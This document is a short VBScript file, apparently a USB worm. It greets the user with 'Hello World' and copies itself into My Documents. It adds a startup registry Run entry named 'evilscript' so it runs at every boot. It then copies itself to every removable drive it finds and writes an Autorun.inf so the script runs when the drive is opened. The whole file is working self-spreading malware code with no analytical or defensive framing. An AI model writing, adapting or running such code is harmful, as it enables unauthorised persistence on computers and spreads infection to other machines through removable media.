Wscript.echo "Hello World"
Set WshShell = WScript.CreateObject("WScript.Shell")
Dim oFSO
Set oFSO = CreateObject("Scripting.FileSystemObject")
oFSO.CopyFile WScript.ScriptFullName,WshShell.SpecialFolders("MyDocuments")&"\script.vbs",True

WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\evilscript", WshShell.SpecialFolders("MyDocuments")&"\script.vbs"

Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\root\cimv2")
Set colDisks = objWMIService.ExecQuery ("Select * from Win32_LogicalDisk")
nb = 0
For Each objDisk in colDisks
If objDisk.DriveType = 2 Then
oFSO.CopyFile WScript.ScriptFullName,objDisk.DeviceID & "\script.vbs",True
Const ForWriting = 2
Dim fic
Set fic = oFSO.OpenTextFile(objDisk.DeviceID & "\Autorun.inf", ForWriting, true)
fic.writeLine("[AutoRun]")
fic.writeLine("open=script.vbs")
fic.writeLine("shell\open\Command=script.vbs")
fic.writeLine("shell\explore\Command=script.vbs")
fic.Close
nb = nb + 1
End If
Next
If nb = 0 Then
Wscript.Echo "Aucun périphérique amovible détecté"
End If